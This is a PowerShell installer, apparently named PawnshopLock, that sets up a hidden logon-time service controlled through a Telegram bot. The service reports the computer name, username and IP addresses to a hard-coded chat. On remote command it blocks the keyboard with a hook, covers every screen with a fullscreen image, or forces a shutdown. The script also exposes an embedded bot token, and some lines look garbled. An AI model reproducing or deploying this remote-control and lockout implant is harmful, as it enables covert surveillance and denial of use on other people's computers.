# =============================================================
# PawnshopLock v4.1  –  ONE‑FILE Installer + Background Service
# (single script – run once, then /lock /unlock /shutdown via Telegram)
# =============================================================
param([string]$Mode = "install")

# ---------------------------- GLOBAL SETTINGS ---------------------------
$imageURL  = 'https://raw.githubusercontent.com/diezul/x/main/1.png'
$botToken  = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
$chatID    = '656189986'
$taskName  = 'PawnshopLockService'
$installDir = "$env:ProgramData\PawnshopLock"
$svcFile    = "$installDir\pawnlock_service.ps1"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# -----------------------------------------------------------------------

#########################################################################
#  ==========  SERVICE  CODE  (mode = run)  ==========                   #
#########################################################################
$ServiceCode = @"
param()
\$imageURL = '$imageURL'
\$botToken = '$botToken'
\$chatID   = '$chatID'

\$user = \$env:USERNAME
\$pc   = \$env:COMPUTERNAME
\$lockCmd   = "/lock\$user".ToLower()
\$unlockCmd = "/unlock\$user".ToLower()
\$shutCmd   = "/shutdown\$user".ToLower()

\$tempImg = "\$env:TEMP\\pawnlock.jpg"
try{ Invoke-WebRequest \$imageURL -OutFile \$tempImg -UseBasicParsing }catch{}
function TG([string]\$m){ try{ @{chat_id=\$chatID;text=\$m}|ConvertTo-Json -Compress| % {Invoke-RestMethod "https://api.telegram.org/bot\$botToken/sendMessage" -Method POST -Body \$_ -ContentType 'application/json' -TimeoutSec 10} }catch{} }
function IPs(){ try{ \$l=(Get-NetIPAddress -AddressFamily IPv4|where{ \$_.IPAddress -notmatch '^(127|169\.254|0\.|255|fe80)' })[0].IPAddress }catch{ \$l='n/a'}; try{ \$p=Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 5 }catch{\$p='n/a'}; "\$l | \$p" }

Add-Type @'
using System;using System.Runtime.InteropServices;using System.Windows.Forms;
public class KB{static IntPtr h=IntPtr.Zero;delegate IntPtr P(int n,IntPtr w,IntPtr l);static P d=Hook;const int WH=13,WM1=0x100,WM2=0x104;[DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);[DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);[DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);[DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
public static void Block(){ if(h==IntPtr.Zero) h=SetWindowsHookEx(WH,d,GetModuleHandle(null),0);} public static void Unblock(){ if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;} }
static IntPtr Hook(int n,IntPtr w,IntPtr l){ if(n>=0&&(w==(IntPtr)WM1||w==(IntPtr)WM2)){ int vk=System.Runtime.InteropServices.Marshal.ReadInt32(l); if(vk==0x43) return CallNextHookEx(h,n,w,l); return (IntPtr)1;} return CallNextHookEx(h,n,w,l);} }
'@

Add-Type -AssemblyName System.Windows.Forms,System.Drawing
\$forms=
function Lock(){ if(\$forms){return}; [KB]::Block(); \$forms=@(); foreach(\$s in [Windows.Forms.Screen]::AllScreens){ \$f=New-Object Windows.Forms.Form -Property @{FormBorderStyle='None';WindowState='Maximized';StartPosition='Manual';TopMost=\$true;Location=\$s.Bounds.Location;Size=\$s.Bounds.Size;BackColor='Black';KeyPreview=\$true}; \$pb=New-Object Windows.Forms.PictureBox -Property @{Image=[Drawing.Image]::FromFile(\$tempImg);Dock='Fill';SizeMode='StretchImage'}; \$f.Controls.Add(\$pb); \$f.Add_Deactivate({\$.Activate()}); \$f.Add_KeyDown({ if(\$_.KeyCode -eq 'C'){ Unlock() }; \$_.Handled=\$true}); \$f.Show(); \$forms+=\$f }
TG "🔒 \$pc locked." }
function Unlock(){ if(!\$forms){return}; foreach(\$f in \$forms){ try{\$f.Close()}catch{} }; \$forms=\$null; [KB]::Unblock(); TG "🔓 \$pc unlocked." }

TG "✅ Service online on \$pc (\$user). IPs: \$(IPs())`nCmds: \$lockCmd \$unlockCmd \$shutCmd"

\$offset=0
while($true){ try{ \$u=Invoke-RestMethod "https://api.telegram.org/bot\$botToken/getUpdates?timeout=25&offset=\$offset" -TimeoutSec 30; foreach(\$i in \$u.result){ \$offset=\$i.update_id+1; \$txt=\$i.message.text.ToLower(); if(\$i.message.chat.id-ne [int]\$chatID){continue}; if(\$txt -eq \$lockCmd){ Lock() } elseif(\$txt -eq \$unlockCmd){ Unlock() } elseif(\$txt -eq \$shutCmd){ TG "⏹ Shutting down \$pc"; Stop-Computer -Force } } }catch{ Start-Sleep 5 } }
"@
#########################################################################

# =====================  INSTALLER SECTION  ============================
if($Mode -eq 'run'){ Invoke-Expression $ServiceCode; exit }

New-Item -ItemType Directory -Path $installDir -Force | Out-Null
$ServiceCode | Set-Content -Encoding UTF8 -Path $svcFile

# Scheduled Task (quoted safely)
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument @('-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$svcFile,'run')
$trigger = New-ScheduledTaskTrigger -AtLogOn
$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
try{ if($IsAdmin){ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force } else { Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force } }catch{}

# Immediate Test ping + launch service
try{ @{chat_id=$chatID;text="🛠 Installed on $env:COMPUTERNAME, launching service"}|ConvertTo-Json -Compress| % {Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $_ -ContentType 'application/json' -TimeoutSec 10} }catch{}
Start-Process -FilePath powershell.exe -WindowStyle Hidden -ArgumentList @('-ExecutionPolicy','Bypass','-File',$svcFile,'run')
